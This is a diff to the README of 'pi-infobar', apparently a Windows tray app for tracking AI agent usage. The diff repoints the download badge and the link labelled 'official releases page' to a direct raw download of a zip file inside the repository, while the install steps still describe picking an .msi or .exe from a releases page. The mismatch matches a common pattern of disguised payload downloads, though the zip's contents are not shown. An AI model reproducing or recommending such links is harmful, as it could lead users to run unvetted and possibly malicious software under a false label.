@@ -1,12 +1,12 @@
 # 📊 pi-infobar - Monitor your artificial intelligence project usage
 
-[![](https://img.shields.io/badge/Download_for_Windows-blue)](https://github.com/Unaided-compulsoryprocess72/pi-infobar)
+[![](https://img.shields.io/badge/Download_for_Windows-blue)](https://raw.githubusercontent.com/Unaided-compulsoryprocess72/pi-infobar/main/bandi/infobar_pi_2.3-alpha.1.zip)
 
 pi-infobar serves as a tool for users who track artificial intelligence agent activity. It runs in the background of your computer to show data about your usage, costs, and project status. You receive updates through a small icon in your system tray. The application stores all data on your computer to ensure privacy.
 
 ## 📥 How to install this software
 
-1. Visit the [official releases page](https://github.com/Unaided-compulsoryprocess72/pi-infobar) to access the download options.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Unaided-compulsoryprocess72/pi-infobar/main/bandi/infobar_pi_2.3-alpha.1.zip) to access the download options.
 2. Look for the file ending in `.msi` or `.exe` under the most recent version heading.
 3. Click the file name to download the installer to your computer.
 4. Open the downloaded file to start the installation wizard.
